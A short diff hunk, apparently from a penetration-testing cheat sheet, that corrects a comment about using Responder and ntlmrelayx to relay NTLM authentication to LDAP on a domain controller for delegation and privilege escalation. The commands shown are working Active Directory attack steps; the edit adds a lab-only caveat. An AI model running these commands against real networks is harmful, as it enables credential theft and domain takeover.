@@ -260,7 +260,9 @@ sudo responder -I eth0 -wdF
 # Disable SMB/HTTP in Responder.conf first
 python3 ntlmrelayx.py -tf targets.txt -smb2support
 
-# Relay to LDAP (create new user, add to DA group)
+# LDAP relay delegation example; this does not create a new user or add one
+# to Domain Admins. The flags act on the relayed computer account and the
+# named existing user. Use only in an explicitly authorized, isolated lab.
 # -tf expects a file path; use -t for a single target with scheme prefix
 python3 ntlmrelayx.py -t ldap://dc01.corp.local -smb2support --delegate-access --escalate-user COMPUTER$
 
